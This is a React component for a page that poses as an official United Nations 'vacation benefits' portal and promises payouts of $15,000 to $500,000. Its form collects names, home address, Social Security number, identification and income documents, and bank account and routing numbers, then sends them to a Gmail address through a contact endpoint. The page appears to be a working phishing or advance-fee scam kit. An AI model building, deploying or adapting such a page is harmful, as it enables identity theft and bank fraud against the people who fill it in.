"use client";
import { useState } from "react";
import { Info } from "lucide-react";

export default function Benefits() {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    homeAddress: "",
    havingLifeInsurance: "",
    applyingForAccident: "",
    eventAddress: "",
    socialSecurityNumber: "",
    proofOfIncome: null,
    validIdentification: null,
    employmentLetter: null,
    accountNumber: "",
    accountName: "",
    bank: "",
    routingNumber: "",
    honeypot: "" // Hidden spam prevention field
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<string | null>(null); // 'success', 'error', null
  const [validationErrors, setValidationErrors] = useState<string[]>([]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value, type } = e.target;
    
    if (type === 'file') {
      const fileInput = e.target as HTMLInputElement;
      setFormData(prev => ({
        ...prev,
        [name]: fileInput.files?.[0] || null
      }));
    } else {
      setFormData(prev => ({
        ...prev,
        [name]: value
      }));
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      // Prepare email content
      const emailData = {
        firstName: formData.firstName,
        lastName: formData.lastName,
        email: 'unvacationportal95@gmail.com', // Default email since this form doesn't collect email
        subject: "New Benefit Claims Submission",
        message: `
Benefit Claims Details:

Personal Information:
- Name: ${formData.firstName} ${formData.lastName}
- Home Address: ${formData.homeAddress}
- Life Insurance: ${formData.havingLifeInsurance}
- Applying for Accident: ${formData.applyingForAccident}
- Event Address: ${formData.eventAddress}
- Social Security Number: ${formData.socialSecurityNumber ? '[PROVIDED]' : '[NOT PROVIDED]'}

Supporting Documents:
- Proof of Income: ${formData.proofOfIncome ? formData.proofOfIncome.name : 'Not uploaded'}
- Valid Identification: ${formData.validIdentification ? formData.validIdentification.name : 'Not uploaded'}
- Employment Letter: ${formData.employmentLetter ? formData.employmentLetter.name : 'Not uploaded'}

Bank Information:
- Account Number: ${formData.accountNumber}
- Account Name: ${formData.accountName}
- Bank: ${formData.bank}
- Routing Number: ${formData.routingNumber}
        `,
        honeypot: formData.honeypot
      };

      const response = await fetch('/api/contact', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(emailData),
      });

      const result = await response.json();

      if (response.ok) {
        setSubmitStatus('success');
        // Clear form on success
        setFormData({
          firstName: "",
          lastName: "",
          homeAddress: "",
          havingLifeInsurance: "",
          applyingForAccident: "",
          eventAddress: "",
          socialSecurityNumber: "",
          proofOfIncome: null,
          validIdentification: null,
          employmentLetter: null,
          accountNumber: "",
          accountName: "",
          bank: "",
          routingNumber: "",
          honeypot: ""
        });
      } else {
        setSubmitStatus('error');
        console.error('Submission error:', result);
      }
    } catch (error) {
      setSubmitStatus('error');
      console.error('Network error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      {/* Page header */}
      <section className="bg-[#071b3a] text-white py-12 border-b-4 border-[#c9a227]">
        <div className="container">
          <div className="text-xs text-slate-400 mb-3">HOME / BENEFIT CLAIMS</div>
          <h1 className="text-4xl font-black">Benefit Claims</h1>
          <p className="mt-3 text-slate-300">Claim your entitled UN vacation benefits through this official portal.</p>
        </div>
      </section>

      {/* Form */}
      <section className="bg-white py-16">
        <div className="container max-w-3xl mx-auto">
          {/* Benefit Range Notice */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-8">
            <div className="flex items-start gap-3">
              <Info className="text-blue-600 mt-0.5 flex-shrink-0" size={20} />
              <div>
                <p className="text-sm text-blue-800">
                  <strong>Benefit Range:</strong> Annual vacation benefits range from $15,000 to $500,000 depending on 
                  deployment location, safety and personnel form. Benefits are paid after one vacation application.
                </p>
              </div>
            </div>
          </div>

          {/* Our Partner Banks */}
          <div className="mb-12">
            <h2 className="text-lg font-bold text-[#071b3a] mb-6">Our Partner Banks</h2>
            <p className="text-sm text-slate-600 mb-6">
              Check which bank branch applies to your payment processing location. For UN benefit disbursement network within 
              deployment and local bank information.
            </p>
            
            <div className="flex items-center gap-4 p-4 bg-slate-50 rounded-lg border border-slate-200">
              <div className="w-12 h-12 bg-blue-600 rounded-lg flex items-center justify-center text-white font-bold">
                💳
              </div>
              <div>
                <h3 className="font-bold text-[#071b3a]">First Bank</h3>
                <p className="text-sm text-slate-600">Trust Global</p>
              </div>
            </div>
          </div>

          {/* Status Messages */}
          {submitStatus === 'success' && (
            <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-8">
              <div className="flex items-center gap-3">
                <div className="text-green-600">✓</div>
                <div>
                  <div className="text-sm font-bold text-green-800">Benefit Claim Submitted Successfully!</div>
                  <div className="text-xs text-green-700">
                    Your benefit claim has been received and will be processed. You will be contacted regarding the status.
                  </div>
                </div>
              </div>
            </div>
          )}

          {submitStatus === 'error' && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-8">
              <div className="flex items-center gap-3">
                <div className="text-red-600">✗</div>
                <div>
                  <div className="text-sm font-bold text-red-800">Submission Failed</div>
                  <div className="text-xs text-red-700">
                    There was an error submitting your benefit claim. Please try again or contact support.
                  </div>
                </div>
              </div>
            </div>
          )}

          <form onSubmit={handleSubmit} className="bg-white border border-slate-200 rounded-lg shadow-sm">
            {/* Honeypot field - hidden from users */}
            <input
              type="text"
              name="honeypot"
              value={formData.honeypot}
              onChange={handleInputChange}
              style={{ display: 'none' }}
              tabIndex={-1}
              autoComplete="off"
            />
            {/* Personal Information */}
            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                PERSONAL INFORMATION
              </h2>
              
              <div className="grid gap-6 md:grid-cols-2">
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    First Name
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Last Name
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Home / Residential Address
                  </label>
                  <textarea
                    name="homeAddress"
                    value={formData.homeAddress}
                    onChange={handleInputChange}
                    rows={3}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 resize-none"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Are you having life insurance?
                  </label>
                  <div className="flex gap-4">
                    <label className="flex items-center">
                      <input
                        type="radio"
                        name="havingLifeInsurance"
                        value="Yes"
                        checked={formData.havingLifeInsurance === "Yes"}
                        onChange={handleInputChange}
                        className="mr-2"
                      />
                      Yes
                    </label>
                    <label className="flex items-center">
                      <input
                        type="radio"
                        name="havingLifeInsurance"
                        value="No"
                        checked={formData.havingLifeInsurance === "No"}
                        onChange={handleInputChange}
                        className="mr-2"
                      />
                      No
                    </label>
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Are you applying for accident?
                  </label>
                  <div className="flex gap-4">
                    <label className="flex items-center">
                      <input
                        type="radio"
                        name="applyingForAccident"
                        value="Yes"
                        checked={formData.applyingForAccident === "Yes"}
                        onChange={handleInputChange}
                        className="mr-2"
                      />
                      Yes
                    </label>
                    <label className="flex items-center">
                      <input
                        type="radio"
                        name="applyingForAccident"
                        value="No"
                        checked={formData.applyingForAccident === "No"}
                        onChange={handleInputChange}
                        className="mr-2"
                      />
                      No
                    </label>
                  </div>
                </div>

                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Event Address
                  </label>
                  <textarea
                    name="eventAddress"
                    value={formData.eventAddress}
                    onChange={handleInputChange}
                    rows={3}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 resize-none"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Social Security Number (SSN)
                  </label>
                  <input
                    type="text"
                    name="socialSecurityNumber"
                    value={formData.socialSecurityNumber}
                    onChange={handleInputChange}
                    placeholder="XXX-XX-XXXX (encrypted and used for identity verification)"
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
              </div>
            </div>
            {/* Supporting Documents */}
            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                SUPPORTING DOCUMENTS
              </h2>
              
              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Proof of Income
                  </label>
                  <input
                    type="file"
                    name="proofOfIncome"
                    onChange={handleInputChange}
                    accept=".pdf,.jpg,.jpeg,.png"
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 bg-white file:mr-4 file:py-1 file:px-3 file:rounded file:border-0 file:text-sm file:font-medium file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"
                  />
                  <p className="text-xs text-slate-500 mt-1">
                    Choose File No file chosen
                  </p>
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Valid Identification
                  </label>
                  <input
                    type="file"
                    name="validIdentification"
                    onChange={handleInputChange}
                    accept=".pdf,.jpg,.jpeg,.png"
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 bg-white file:mr-4 file:py-1 file:px-3 file:rounded file:border-0 file:text-sm file:font-medium file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"
                  />
                  <p className="text-xs text-slate-500 mt-1">
                    Last 3 supporting validity & 1 consecutive monthly pending (PDF, JPG, PNG)
                  </p>
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Employment Letter
                  </label>
                  <input
                    type="file"
                    name="employmentLetter"
                    onChange={handleInputChange}
                    accept=".pdf,.jpg,.jpeg,.png"
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 bg-white file:mr-4 file:py-1 file:px-3 file:rounded file:border-0 file:text-sm file:font-medium file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"
                  />
                  <p className="text-xs text-slate-500 mt-1">
                    Choose File No file chosen
                  </p>
                </div>
              </div>
            </div>

            {/* Bank Information */}
            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                BANK INFORMATION
              </h2>
              
              <div className="grid gap-6 md:grid-cols-2">
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Account Number
                  </label>
                  <input
                    type="text"
                    name="accountNumber"
                    value={formData.accountNumber}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Account Name
                  </label>
                  <input
                    type="text"
                    name="accountName"
                    value={formData.accountName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Bank
                  </label>
                  <input
                    type="text"
                    name="bank"
                    value={formData.bank}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Routing Number
                  </label>
                  <input
                    type="text"
                    name="routingNumber"
                    value={formData.routingNumber}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <div className="p-8 text-center">
              <button
                type="submit"
                disabled={isSubmitting}
                className={`px-8 py-3 rounded font-bold text-white transition-colors ${
                  isSubmitting 
                    ? 'bg-gray-400 cursor-not-allowed' 
                    : 'bg-[#0b8fe0] hover:bg-[#0a7fc9]'
                }`}
              >
                {isSubmitting ? 'SUBMITTING...' : 'SUBMIT BENEFIT CLAIM'}
              </button>
            </div>
          </form>
        </div>
      </section>
    </>
  );
}